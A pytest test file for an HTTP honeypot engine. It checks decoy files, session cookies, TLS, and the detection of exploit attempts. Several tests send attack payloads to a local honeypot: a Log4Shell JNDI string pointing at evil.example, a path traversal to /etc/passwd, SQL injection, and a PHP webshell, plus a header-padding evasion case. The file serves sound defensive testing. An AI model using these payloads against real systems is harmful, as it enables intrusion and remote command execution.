"""HTTP engine realistic well-known endpoints + session cookies + HTTPS.

Verifies:
* `/robots.txt`, `/favicon.ico`, `/sitemap.xml`, `/.well-known/security.txt`
  are served (real servers always have these; 404 is a fingerprint).
* Every request issues a persona-named session cookie (PHPSESSID etc).
* Repeat visits with the same cookie escalate severity once the recon
  threshold is hit.
* TLS-enabled deploy serves HTTPS on the configured port via a self-signed
  cert generated in `tls/<honeypot_name>/`.
"""

import asyncio
import contextlib
import os
import socket
import ssl

import httpx
import pytest

os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"


def _free_port() -> int:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    await init_db()
    yield
    event_buffer.reset_for_tests()
    await close_db()


@pytest.fixture
async def http_server():
    """Plain-HTTP honeypot on a free port. Persona is pinned to apache_ubuntu
    so cookie name + Server header are deterministic across runs."""
    from honeypot_mcp.engines.http import HTTPEngine
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotType

    port = _free_port()
    async with get_session() as session:
        hp = Honeypot(name="http-endpoints-test", type=HoneypotType.HTTP, port=port)
        session.add(hp)
        await session.flush()

    engine = HTTPEngine()
    cid = await engine.start("http-endpoints-test", port, {"persona": "apache_ubuntu"})
    try:
        yield port
    finally:
        await engine.stop(cid)


@pytest.fixture
async def https_server(tmp_path, monkeypatch):
    """TLS-enabled honeypot. Cert lives in a temp dir so we don't litter the
    repo with `tls/` directories during testing."""
    monkeypatch.chdir(tmp_path)

    from honeypot_mcp.engines.http import HTTPEngine
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotType

    port = _free_port()
    async with get_session() as session:
        hp = Honeypot(name="https-test", type=HoneypotType.HTTP, port=port)
        session.add(hp)
        await session.flush()

    engine = HTTPEngine()
    cid = await engine.start("https-test", port, {"persona": "nginx_stable", "tls": True})
    try:
        yield port
    finally:
        await engine.stop(cid)


@pytest.mark.asyncio
async def test_robots_txt_advertises_bait(http_server):
    port = http_server
    async with httpx.AsyncClient() as client:
        r = await client.get(f"http://127.0.0.1:{port}/robots.txt")
    assert r.status_code == 200
    assert "Disallow: /admin/" in r.text
    assert "Disallow: /.env" in r.text
    # Persona header should still be present
    assert "Apache" in r.headers.get("Server", "")


@pytest.mark.asyncio
async def test_favicon_returns_ico_bytes(http_server):
    port = http_server
    async with httpx.AsyncClient() as client:
        r = await client.get(f"http://127.0.0.1:{port}/favicon.ico")
    assert r.status_code == 200
    assert r.headers.get("Content-Type", "").startswith("image/")
    # ICO magic bytes
    assert r.content[:4] == b"\x00\x00\x01\x00"


@pytest.mark.asyncio
async def test_sitemap_xml_valid(http_server):
    port = http_server
    async with httpx.AsyncClient() as client:
        r = await client.get(f"http://127.0.0.1:{port}/sitemap.xml")
    assert r.status_code == 200
    assert '<?xml version="1.0"' in r.text
    assert "<urlset" in r.text


@pytest.mark.asyncio
async def test_security_txt_has_contact(http_server):
    port = http_server
    async with httpx.AsyncClient() as client:
        r = await client.get(f"http://127.0.0.1:{port}/.well-known/security.txt")
    assert r.status_code == 200
    assert "Contact: mailto:" in r.text


@pytest.mark.asyncio
async def test_session_cookie_issued(http_server):
    """First request issues a cookie under the persona's cookie name."""
    port = http_server
    async with httpx.AsyncClient() as client:
        r = await client.get(f"http://127.0.0.1:{port}/")
        # apache_ubuntu persona uses PHPSESSID
        assert "PHPSESSID" in r.cookies or any(k.lower() == "phpsessid" for k in r.cookies)


@pytest.mark.asyncio
async def test_repeat_visits_escalate_severity(http_server):
    """Same session hitting many endpoints → http_active_recon at MEDIUM
    severity. Closes the 'each request is independent' fingerprint."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = http_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        async with httpx.AsyncClient() as client:
            for i in range(7):
                await client.get(f"http://127.0.0.1:{port}/path-{i}")
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(select(Alert).where(Alert.event_type == "http_active_recon"))
        recon = list(result.scalars().all())

    assert len(recon) >= 1, "expected http_active_recon after threshold hits"


@pytest.mark.asyncio
async def test_https_serves_over_tls(https_server):
    """TLS-enabled honeypot accepts an HTTPS connection. We disable cert
    verification because the cert is self-signed — a real attacker won't
    verify it either."""
    port = https_server
    # Build an SSLContext that skips verification (the cert is self-signed).
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    async with httpx.AsyncClient(verify=ctx) as client:
        r = await client.get(f"https://127.0.0.1:{port}/robots.txt")
    assert r.status_code == 200
    assert "Disallow:" in r.text


@pytest.mark.asyncio
async def test_https_cert_persisted_across_starts(https_server, tmp_path):
    """Cert files exist in tls/<honeypot_name>/ after start. Same cert is
    reused on subsequent starts (stable across restarts)."""
    cert_path = tmp_path / "tls" / "https-test" / "server.crt"
    key_path = tmp_path / "tls" / "https-test" / "server.key"
    assert cert_path.exists()
    assert key_path.exists()
    # Cert is non-empty PEM
    assert b"BEGIN CERTIFICATE" in cert_path.read_bytes()


@pytest.mark.asyncio
async def test_session_cookie_persists_across_requests(http_server):
    """Reusing the same client (cookie jar) — only the FIRST response sets a
    new Set-Cookie. Subsequent requests reuse the session id, and the
    in-memory session.hits counter increments."""
    port = http_server
    async with httpx.AsyncClient() as client:
        r1 = await client.get(f"http://127.0.0.1:{port}/")
        # First response must include the persona's session cookie.
        first_cookie = r1.cookies.get("PHPSESSID")
        assert first_cookie is not None

        r2 = await client.get(f"http://127.0.0.1:{port}/another")
        # Second response should NOT re-issue a new cookie — the engine
        # only sets the cookie when is_new is True.
        assert "PHPSESSID" not in r2.cookies
        # Verify same session was sent back
        assert client.cookies.get("PHPSESSID") == first_cookie


@pytest.mark.asyncio
async def test_raw_body_capture_for_json_post(http_server):
    """POST with a JSON body should land in payload.raw_body_b64 (base64-
    encoded) plus raw_content_type. Form bodies still flow through post_data
    so credential_match keeps working — verified by the parallel test below.
    """
    import base64
    import json

    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = http_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        body = {"cmd": "id", "shell": "<?php system($_GET['c']); ?>"}
        async with httpx.AsyncClient() as client:
            await client.post(
                f"http://127.0.0.1:{port}/api/exec",
                content=json.dumps(body).encode(),
                headers={"Content-Type": "application/json"},
            )
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        # The body is a webshell, so it's now (correctly) re-tagged as an
        # exploit attempt — but the raw body is still captured verbatim.
        result = await session.execute(
            select(Alert).where(
                Alert.event_type.in_(
                    ("http_probe", "http_credential_submit", "http_exploit_attempt")
                )
            )
        )
        alerts = list(result.scalars().all())
    assert alerts, "expected at least one alert for the POST"
    matching = [a for a in alerts if a.payload.get("raw_body_b64")]
    assert matching, "expected raw_body_b64 to be captured on JSON POST"
    decoded = base64.b64decode(matching[0].payload["raw_body_b64"])
    assert b"<?php system" in decoded, "raw body should preserve exploit payload verbatim"
    assert "application/json" in matching[0].payload["raw_content_type"]
    # And the webshell must be flagged.
    assert matching[0].event_type == "http_exploit_attempt"
    assert "webshell" in matching[0].payload.get("exploit_categories", [])


@pytest.mark.asyncio
async def test_form_post_still_parses_into_post_data(http_server):
    """credential_match.py reads payload.post_data — verify the form path
    still produces that field. Regression test for the raw-body change."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = http_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"http://127.0.0.1:{port}/wp-admin",
                data={"log": "admin", "pwd": "hunter2"},
            )
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(
            select(Alert).where(Alert.event_type == "http_credential_submit")
        )
        alerts = list(result.scalars().all())
    assert alerts, "expected http_credential_submit for the form POST"
    pd = alerts[0].payload.get("post_data") or {}
    assert pd.get("log") == "admin"
    assert pd.get("pwd") == "hunter2"


@pytest.mark.asyncio
async def test_login_response_varies_across_attempts(http_server):
    """POST /login must rotate across multiple failure-string variants so
    a scanner can't byte-diff two consecutive responses to confirm the
    absence of a real auth backend."""
    port = http_server
    bodies: set[str] = set()
    async with httpx.AsyncClient() as client:
        for _ in range(12):
            r = await client.post(
                f"http://127.0.0.1:{port}/login",
                data={"username": "admin", "password": "wrong"},
            )
            assert r.status_code == 401
            bodies.add(r.text)
    # 6 variants in the engine; 12 samples should hit at least 3 distinct
    # bodies with probability close to 1.0. If this flakes the engine
    # regressed to a fixed response.
    assert len(bodies) >= 3, f"expected ≥3 distinct login-failed bodies, got {len(bodies)}"


@pytest.mark.asyncio
async def test_env_decoy_contains_aws_key_shape(http_server):
    """GET /.env must serve a decoy `.env` file containing an `AKIA…` shaped
    string (a fake AWS access-key-id). Catches both the path-interception
    wiring and the token-shape filler."""
    import re

    port = http_server
    async with httpx.AsyncClient() as client:
        r = await client.get(f"http://127.0.0.1:{port}/.env")
    assert r.status_code == 200
    assert "AWS_ACCESS_KEY_ID" in r.text
    assert re.search(r"AKIA[A-Z0-9]{16}", r.text), (
        f"expected AKIA<16> token shape in /.env, got: {r.text[:300]}"
    )


@pytest.mark.asyncio
async def test_kube_decoy_returns_kubeconfig_shape(http_server):
    """GET /.kube/config must serve a YAML kubeconfig with the expected
    top-level keys. Scanners that pivot off `kind: Config` will engage."""
    port = http_server
    async with httpx.AsyncClient() as client:
        r = await client.get(f"http://127.0.0.1:{port}/.kube/config")
    assert r.status_code == 200
    text = r.text
    assert "apiVersion: v1" in text
    assert "kind: Config" in text
    assert "clusters:" in text


# Avoid lint complaints about unused imports
_ = contextlib


@pytest.mark.asyncio
async def test_http_exploit_signatures_detected(http_server):
    """Exploit payloads across path / query / header / body must be flagged as
    http_exploit_attempt with the right category and severity."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = http_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            # Log4Shell in the User-Agent header.
            await client.get(
                f"http://127.0.0.1:{port}/",
                headers={"User-Agent": "${jndi:ldap://evil.example/a}"},
            )
            # Path traversal + LFI in the query string.
            await client.get(f"http://127.0.0.1:{port}/p?f=../../../../etc/passwd")
            # SQL injection in the query string.
            await client.get(f"http://127.0.0.1:{port}/s?q=1 UNION SELECT user,pass FROM users")
            # PHP webshell in a raw body.
            await client.post(
                f"http://127.0.0.1:{port}/up",
                content=b"<?php system($_GET[c]); ?>",
                headers={"Content-Type": "application/octet-stream"},
            )
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(
            select(Alert).where(Alert.event_type == "http_exploit_attempt")
        )
        alerts = list(result.scalars().all())

    cats = {c for a in alerts for c in a.payload.get("exploit_categories", [])}
    assert {"log4shell", "path_traversal", "sqli", "webshell"}.issubset(cats), cats
    # Log4Shell and webshell are CRITICAL.
    sev_by_cat = {
        c: a.severity.value for a in alerts for c in a.payload.get("exploit_categories", [])
    }
    assert sev_by_cat["log4shell"] == "critical"
    assert sev_by_cat["webshell"] == "critical"


@pytest.mark.asyncio
async def test_exploit_body_not_evaded_by_padded_headers(http_server):
    """The scanned surface is capped at 32 KB total. If the body were scanned
    last (as it used to be), an attacker could pad earlier fields — a
    handful of large headers is enough — to push a real exploit payload in
    the body out of the scanned window entirely, so it would classify as
    ordinary traffic instead of http_exploit_attempt. The body must be
    scanned regardless of how much header padding precedes it."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = http_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        # ~35 KB of header padding — more than _MAX_SCAN_SURFACE (32 KB) —
        # spread across headers so no single one hits aiohttp's per-field cap.
        padding_headers = {f"X-Pad-{i}": "A" * 7000 for i in range(5)}
        async with httpx.AsyncClient(timeout=5.0) as client:
            await client.post(
                f"http://127.0.0.1:{port}/up",
                content=b"<?php system($_GET[c]); ?>",
                headers={"Content-Type": "application/octet-stream", **padding_headers},
            )
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(
            select(Alert).where(Alert.event_type == "http_exploit_attempt")
        )
        alerts = list(result.scalars().all())

    assert alerts, "webshell body must still be classified as an exploit despite header padding"
    assert "webshell" in alerts[0].payload.get("exploit_categories", [])
    assert alerts[0].severity.value == "critical"
